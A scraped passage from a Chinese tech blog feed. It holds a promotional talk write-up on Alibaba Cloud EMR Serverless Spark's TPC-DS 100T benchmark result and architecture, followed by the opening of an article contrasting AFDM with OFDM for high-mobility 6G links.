                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p><strong>演讲者：一锤（周克勇）| EMR Serverless Spark 技术负责人</strong></p>
<p>2025年9月，阿里云EMR Serverless Spark 以QphDS超6568万分的性能结果成功登顶TPC-DS 100T榜单，这是全球大数据领域最具权威性和挑战性的性能测试基准。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3eb2cd73c7124e6a89fc9b0160f31bfc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=HfRyscQ87tgbekZjyGJHbRlTa38%3D" alt="image (39).png" loading="lazy"/></p>
<p>阿里云EMR Serverless Spark TPC-DS 100T 性能测试结果</p>
<blockquote>
<p>TPC-DS Benchmark是数据仓库领域最新和最复杂的权威测试标准，被工业界和学术界广泛认可，也是数据仓库选型的重要参考指标。TPC-DS包含99个查询，从简单的全局聚合到复杂的20以上多表连接，体现了真实分析场景日益增长的复杂度。其中，100T是TPC-DS提供的最大测试数据集，最大表有288,017,344,252（2880亿）条数据，迄今为止只有阿里云EMR和Databricks成功通过了该榜单的官方评审。</p>
</blockquote>
<p>阿里云 EMR Serverless Spark实现了 <strong>性能提升100%</strong>、<strong>性价比提升500%</strong> 的突破，证明了EMR Serverless Spark 在 OpenLake湖仓底座架构下，超大规模、超高复杂度的数据分析、数据更新、数据处理的市场领先能力。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/756e5be154054086b51e6099ab1209cc~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=MNAR%2BIQHew0X9fCxwpoozlJQ%2FTs%3D" alt="image (40).png" loading="lazy"/></p>
<p>本文将深入剖析支撑这一成绩背后的技术内核，从产品定位、架构设计到核心优化策略，全面解读 EMR Serverless Spark 如何实现“高性能、低成本、高弹性、强兼容”的统一。</p>
<h2 data-id="heading-0">产品定位与核心场景</h2>
<p>EMR Serverless Spark 定位为新一代 <strong>Lakehouse（湖仓一体）平台</strong>，旨在融合传统数据仓库的极致查询性能与数据湖的低成本、开放性优势。</p>
<p>其核心聚焦三大场景：</p>
<ol>
<li>
<p><strong>湖仓分析场景</strong>：以高度优化的 Spark 替代 Hive 执行 ETL/ELT 任务，替代 Trino/Presto 提供高性价比交互式分析。支持 SQL、DataFrame、Pandas、RDD 等多种接口，并全面兼容 Paimon、Iceberg、Delta、Hudi 等主流湖表格式。</p>
</li>
<li>
<p><strong>机器学习场景</strong>：作为成熟的分布式 ML 框架，Spark 支持从数据清洗、特征工程到模型训练与批量推理的全流程。内置 MLlib，集成 XGBoost、LightGBM、scikit-learn 等生态工具，并提供 GPU 加速能力，实现 Data + AI 一体化。</p>
</li>
<li>
<p><strong>多模态数据处理场景</strong>：随着大模型兴起，PySpark 成为处理文本、图像、视频等非结构化数据的理想选择。产品推出的 <strong>AI Function</strong> 功能，允许用户在 Spark 作业中直接调用大模型。针对基模训练数据预处理做了专门优化，在文本去重任务中实现 <strong>5倍性能提升</strong>。</p>
</li>
</ol>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e8c52ca3ea5c45d882ab093d2fff3cbf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=MnMc9ThpBU2ygyxe%2BjSLddjizDU%3D" alt="image (41).png" loading="lazy"/></p>
<h2 data-id="heading-1">产品架构与极致弹性</h2>
<p>EMR Serverless Spark 采用标准 Lakehouse 架构：</p>
<ul>
<li>
<p><strong>存储层</strong>：基于阿里云 OSS 对象存储与 OSS-HDFS 接口，提供高吞吐、低成本的持久化能力；</p>
</li>
<li>
<p><strong>元数据层</strong>：兼容 Hive Metastore（HMS）与 Data Lake Formation（DLF），支持 ACID 事务；</p>
</li>
<li>
<p><strong>资源层</strong>：依托阿里云全 Region 的 ECS 资源池，实现近乎无限的弹性供给；</p>
</li>
<li>
<p><strong>引擎层</strong>：核心创新包括 <strong>Fusion 向量化执行引擎</strong> 与 <strong>Celeborn Remote Shuffle Service</strong>；</p>
</li>
<li>
<p><strong>产品层</strong>：提供认证鉴权、开发 IDE、资源监控、智能诊断等企业级功能。</p>
</li>
</ul>
<p><strong>极致弹性</strong> 是其关键竞争力：</p>
<ul>
<li>
<p>支持 <strong>进程级弹性</strong>，最小资源单位低至 1 Core；</p>
</li>
<li>
<p>容器启动时间 &lt;15 秒，会话模式、Standalone模式下实现“零冷启”；</p>
</li>
<li>
<p>采用 Workspace + 队列的双层 Quota 机制，满足多租户资源隔离需求；</p>
</li>
<li>
<p>实际客户案例显示，资源使用波动可从数万核骤降至零，Serverless 架构帮助客户 <strong>节省40%资源成本</strong>。</p>
</li>
</ul>
<p>此外，系统默认提供 <strong>跨可用区高可用</strong> 能力，Spark 控制面与 Celeborn 服务均多 AZ 部署，作业自动故障迁移，SLA 达 99.9%，且无额外费用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/39f2773d1eb544b98c9de8cd882866d0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=usLMeRPNtlKnAme5e4khinJ%2B8xE%3D" alt="image (42).png" loading="lazy"/>
EMR Serverless Spark 产品架构</p>
<h2 data-id="heading-2">全方位生态兼容</h2>
<p>EMR Serverless Spark 坚持 <strong>开放生态优先</strong> 的设计理念：</p>
<ul>
<li>
<p><strong>接口兼容</strong>：完整支持 spark-submit、spark-sql、beeline、JDBC 等经典方式，也集成 Kyuubi（含 HA）、Livy 等交互式查询服务；</p>
</li>
<li>
<p><strong>工具链集成</strong>：无缝对接 Jupyter、Zeppelin、Superset、DBT 等主流开发分析工具；</p>
</li>
<li>
<p><strong>调度系统</strong>：深度适配 Airflow、DolphinScheduler，并在阿里云生态内与 <strong>DataWorks 原生集成</strong>——作为DataWorks“一等公民”，支持 SQL 节点、Notebook、工作流编排、统一权限与数据血缘等；</p>
</li>
<li>
<p><strong>安全与元数据</strong>：支持 Kerberos、LDAP、Ranger；</p>
</li>
<li>
<p><strong>湖格式</strong>：湖格式覆盖 Paimon/Delta/Hudi/Iceberg；</p>
</li>
<li>
<p><strong>外部数据源</strong>：连接 StarRocks、Doris、Hologres、HBase、Elasticsearch、MongoDB、MaxCompute、MySQL 、Postgres等数十种系统。</p>
</li>
</ul>
<p>这种广泛的兼容性极大降低了用户迁移和集成成本，真正实现“开箱即用”。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fe380361dc7f44d0b724851716c1d60d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=7KlCA7ly36yuFaicU2KuYe3jDZY%3D" alt="image (43).png" loading="lazy"/></p>
<h2 data-id="heading-3">TPC-DS 100T 背后的四大核心技术</h2>
<p>官方TPC-DS 100T 测试包含数据生成、导入、Power Test（单并发99查询）、Throughput Test（4并发396查询）、Maintenance Test（Upsert 操作）等环节，最终通过 QphDS 分数衡量综合性能。</p>
<p>阿里云的突破源于以下四大技术创新：</p>
<h3 data-id="heading-4">1. Fusion 向量化执行引擎</h3>
<p>自2019年起研发，Fusion 将 Spark 从行式计算升级为 <strong>列式向量化执行</strong>：</p>
<ul>
<li>
<p>利用 SIMD 指令并行处理多列数据；</p>
</li>
<li>
<p>连续内存布局显著提升 CPU Cache 命中率；</p>
</li>
<li>
<p>异步 IO 与 IO 合并优化读取效率；</p>
</li>
<li>
<p>关键算子（Sort/Window/Join）优化，性能提升达 <strong>300%</strong>。</p>
</li>
</ul>
<p>在 TPC-DS 场景中，Fusion 还引入 Subplan Reuse、Broadcast Join Reuse、Semi Join 哈希表去重等优化，大幅减少重复计算与内存占用。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fd49b01f60be4d41883a36c4394313e5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=kgq71K1AOatomFS765KcJbv8F7k%3D" alt="image (44).png" loading="lazy"/></p>
<h3 data-id="heading-5">2. 与 Paimon 深度协同</h3>
<p>Fusion 与阿里自研湖表格式 Paimon 深度整合：</p>
<ul>
<li>
<p>向量化读写使读性能提升 <strong>70%</strong>，写性能提升 <strong>30%</strong>；</p>
</li>
<li>
<p>Variant 类型相比原始 JSON 提升 <strong>178%</strong>；</p>
</li>
<li>
<p>Shredding 技术进一步加速JSON解析，性能再提升 <strong>364%</strong>。</p>
</li>
</ul>
<h3 data-id="heading-6">3. Celeborn Remote Shuffle Service</h3>
<p>作为 Apache 顶级项目，Celeborn 采用 <strong>推送式 Shuffle 架构</strong>：</p>
<ul>
<li>
<p>在大规模作业中提供更高吞吐与更低延迟；</p>
</li>
<li>
<p>支持副本容错与Stage重算，保障作业稳定性；</p>
</li>
<li>
<p>大规模生产验证，成为业界事实标准。</p>
</li>
</ul>
<h3 data-id="heading-7">4. DLF 3.0 与优化器增强</h3>
<p>基于 Paimon 的 DLF 3.0 提供高性能 ACID 能力，满足 TPC-DS Maintenance 测试要求；同时优化器在 Join 顺序选择、代价模型等方面持续迭代，提升复杂查询效率。</p>
<p><strong>最终成果</strong>：在仅使用一半内存的情况下，QphDS 性能翻倍，性价比提升5倍，所有结果均通过 TPC 官方严格审计。</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/821ba933c3794057ac132607e75d4cec~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=HWHB35XC60C%2FvVWBvFUFi4lu5Gk%3D" alt="image (45).png" loading="lazy"/></p>
<h2 data-id="heading-8">AI 时代的新功能：让 Spark 成为 AI 基础设施</h2>
<p>面对 AI 浪潮，EMR Serverless Spark 推出多项创新功能：</p>
<ul>
<li>
<p><strong>AI Function</strong>：内置 <code>ai_query</code>、<code>ai_sentiment</code>、<code>ai_classify</code>、<code>ai_embedding</code> 等函数，用户可在 SQL 中直接调用大模型，如同使用内置 UDF。支持接入百炼、OpenAI、PAI EAS 或本地 GPU 模型。</p>
</li>
<li>
<p><strong>Spark on GPU</strong>：提供弹性 GPU 实例，按需配置 CPU/GPU 混合机型，避免固定集群成本。支持：</p>
<ul>
<li>
<p>AI Function 本地 GPU 推理；</p>
</li>
<li>
<p>Spark ML（XGBoost/LightGBM）GPU 加速；</p>
</li>
<li>
<p>Spark SQL 向量化 GPU 计算。</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/ebcbab7c50a0438d9b920d0c8ded278e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6Zi_6YeM5LqR5aSn5pWw5o2uQUnmioDmnK8=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1771556335&amp;x-signature=%2Bx68PvNhZXNOGfPU3vQUOw2ZYNI%3D" alt="image (46).png" loading="lazy"/></p>
<ul>
<li>
<p><strong>即将上线功能</strong>：</p>
<ul>
<li>
<p><strong>Spark + Ray 双引擎融合</strong>：满足 Python 分布式与异构计算需求；</p>
</li>
<li>
<p><strong>DuckDB 集成</strong>：针对中小数据分析，在 Notebook 中已内置，未来支持直连 DLF 3.0；</p>
</li>
<li>
<p><strong>文本去重加速</strong>：在 FineWeb-edu（8TB、30亿文档）上，800 核仅需 72 分钟，提速 5 倍。</p>
</li>
</ul>
</li>
</ul>
<hr/>
<h2 data-id="heading-9">携手客户共同成长</h2>
<p>EMR Serverless Spark 已在多家金融、互联网、智能硬件及零售企业的生产环境中稳定运行，广泛应用于数据仓库加速、实时风控、向量检索、机器学习等核心场景。</p>
<p>同时，Celeborn 社区也在多个头部互联网平台和科技企业中落地，支撑高并发、大规模的数据计算需求。</p>
<p>阿里云 EMR Serverless Spark 的 TPC-DS 登顶，不仅体现了优异性能，更体现了架构理念、工程能力和生态战略。在 Data + AI 融合的新时代，它正成为企业构建下一代智能数据基础设施的核心引擎。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[6G 物理层变天AFDM：与其在 OFDM 的死胡同里撞墙，不如换个坐标系“折叠”世界]]></title>    <link>https://juejin.cn/post/7605535884940492851</link>    <guid>https://juejin.cn/post/7605535884940492851</guid>    <pubDate>2026-02-12T13:07:35.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605535884940492851" data-draft-id="7605769126271074350" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="6G 物理层变天AFDM：与其在 OFDM 的死胡同里撞墙，不如换个坐标系“折叠”世界"/> <meta itemprop="keywords" content="前端"/> <meta itemprop="datePublished" content="2026-02-12T13:07:35.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="3GPP仿真实验室"/> <meta itemprop="url" content="https://juejin.cn/user/590875532999898"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            6G 物理层变天AFDM：与其在 OFDM 的死胡同里撞墙，不如换个坐标系“折叠”世界
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/590875532999898/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    3GPP仿真实验室
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-12T13:07:35.000Z" title="Thu Feb 12 2026 13:07:35 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-12
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    4
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>我们先承认一个尴尬的事实：</p>
<p>面对 6G 提出的 <strong>1000 km/h（超高铁）</strong> 和 <strong>28000 km/h（低轨卫星）</strong> 愿景，统治了通信界二十年的王者——OFDM，已经尽力了。</p>
<p>依靠缩短符号时间、加大子载波间隔（SCS），这只是在物理极限的边缘疯狂试探。我们就像在暴风雨中修补一艘漏水的船，补丁打得越多，船越重（CP 开销大、频谱效率低）。</p>
<p><strong>是时候换一艘船了。</strong></p>
<p>今天，我们来聊聊物理层的一场“降维打击”： ​<strong>AFDM 仿射频分复用</strong>​ 。</p>
<hr/>
<h3 data-id="heading-0">01. 完美的代价：OFDM 的基因缺陷</h3>
<p>一切悲剧的根源，早在我们选择 OFDM 的那一刻就注定了。</p>
<p>为了追求频谱效率的极致，我们在频域选择了​<strong>Sinc 函数</strong>​（<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>s</mi><mi>i</mi><mi>n</mi><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo><mi mathvariant="normal">/</mi><mi>x</mi></mrow><annotation encoding="application/x-tex">sin(x)/x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"/><span class="mord mathnormal">s</span><span class="mord mathnormal">in</span><span class="mopen">(</span><span class="mord mathnormal">x</span><span class="mclose">)</span><span class="mord">/</span><span class="mord mathnormal">x</span></span></span></span></span>）作为子载波。</p>
<p>它长得并不像一根完美的针，而是一个带着无数“拖油瓶”的波形：</p>
<ul>
<li><strong>主瓣：</strong> 高耸入云，承载有用信息。</li>
<li><strong>旁瓣 (Side-lobes)：</strong> 像波纹一样向两边扩散，且衰减极其缓慢。</li>
</ul>
<p>OFDM 利用数学上的**“正交性”<strong>，巧妙地让每一个子载波的</strong>峰值**，精准地踩在其他所有子载波的<strong>零点 (Zero Crossing)</strong> 上。</p>
<p>这是一场​<strong>刀尖上的舞蹈</strong>​。</p>
<p>虽然旁瓣拖得很长，但在采样点那一瞬间，大家互不干扰。只要大家都不动，这个平衡就是完美的。</p>
<blockquote>
<p><strong>但在 6G 的世界里，“不动”成了一种奢望。</strong></p>
</blockquote>
<hr/>
<h3 data-id="heading-1">02. 速度的诅咒：从 350km/h 到 7.6km/s</h3>
<p>当你在 350km/h 的高铁上，或者在 7.6km/s 的卫星下，物理世界开始对这个脆弱的数学平衡下手了。</p>
<p>大家通常认为多普勒只是​<strong>频率平移</strong>​。但在 OFDM 的眼里，这简直就是一场 <strong>“旁瓣的屠杀”</strong> 。</p>
<p>设想一下，当整个频谱发生微小的偏移（哪怕只是子载波间隔的 ​<strong>3%</strong> ​）：</p>
<ol>
<li><strong>零点错位：</strong> 接收机做 FFT 采样时，原本应该采到“0”的地方，现在采到了隔壁子载波的​<strong>旁瓣能量</strong>​。</li>
<li><strong>能量海啸：</strong> 由于 Sinc 函数的旁瓣拖得很长，<strong>远处的子载波</strong>也会把能量“泼”过来。</li>
<li><strong>ICI 爆发：</strong> 成千上万个子载波的干扰叠加在一起，形成了恐怖的 ​<strong>ICI（载波间干扰）</strong> ​。</li>
</ol>
<p><strong>(建议配图：OFDM 子载波正交性被破坏的示意图，展示波峰对不准零点)</strong></p>
<p>更绝望的是​<strong>低轨卫星（LEO）场景</strong>​。</p>
<p>当速度达到 ​<strong>7.6 km/s</strong>​，多普勒频移轻松突破 ​<strong>500 kHz</strong>​。</p>
<p>这直接导致​<strong>相干时间（Coherence Time）崩塌</strong>​。</p>
<p>这意味着：<strong>你的导频（Pilot）刚测完信道，还没来得及发数据，信道已经变了。</strong></p>
<p>传统的信道估计逻辑彻底断裂。</p>
<p>这时候，无论你把基站功率开多大，都没用了。因为干扰来自信号内部，信噪比（SINR）被锁死在一个 <strong>“地板”</strong> 上。</p>
<p><strong>网速瞬间从“千兆级”掉回“3G 时代”。</strong></p>
<hr/>
<h3 data-id="heading-2">03. 第一性原理：把“正弦波”扔进垃圾桶</h3>
<p>OFDM 为什么怕多普勒？</p>
<p>因为它用的基底是 ​<strong>正弦波</strong>​——<span class="math math-inline"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><msup><mi>e</mi><mrow><mi>j</mi><mn>2</mn><mi>p</mi><mi>i</mi><mi>f</mi><mi>t</mi></mrow></msup></mrow><annotation encoding="application/x-tex">e^{j2pi ft}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.8491em;"/><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8491em;"><span style="top:-3.063em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"/><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathnormal mtight" style="margin-right:0.05724em;">j</span><span class="mord mtight">2</span><span class="mord mathnormal mtight">p</span><span class="mord mathnormal mtight">i</span><span class="mord mathnormal mtight" style="margin-right:0.10764em;">f</span><span class="mord mathnormal mtight">t</span></span></span></span></span></span></span></span></span></span></span></span></span>。</p>
<p>正弦波是静态的、永恒的。它唯一的弱点就是 <strong>“频率必须精准”</strong> 。</p>
